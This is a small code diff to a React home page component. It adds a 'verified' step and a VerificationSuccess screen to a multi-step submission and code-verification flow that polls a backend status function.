@@ -3,6 +3,7 @@ import { base44 } from "@/api/base44Client";
 import SubmissionForm from "@/components/SubmissionForm";
 import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
+import VerificationSuccess from "@/components/VerificationSuccess";
 
 export default function Home() {
   const urlParams = new URLSearchParams(window.location.search);
@@ -33,7 +34,7 @@ export default function Home() {
         const res = await base44.functions.invoke("checkStatus", { submissionId });
         if (res?.data?.status === "code_ready") {
           clearInterval(pollingRef.current);
-          setStep("code");
+          setStep("verified");
         }
       }, 3000);
     }
@@ -65,6 +66,7 @@ export default function Home() {
         {step === "form" && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
         {step === "validation" && <SuccessScreen data={submittedData} />}
         {step === "code" && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
+        {step === "verified" && <VerificationSuccess data={submittedData} />}
         {step === "success" && <SuccessScreen data={submittedData} />}
       </div>
     </div>
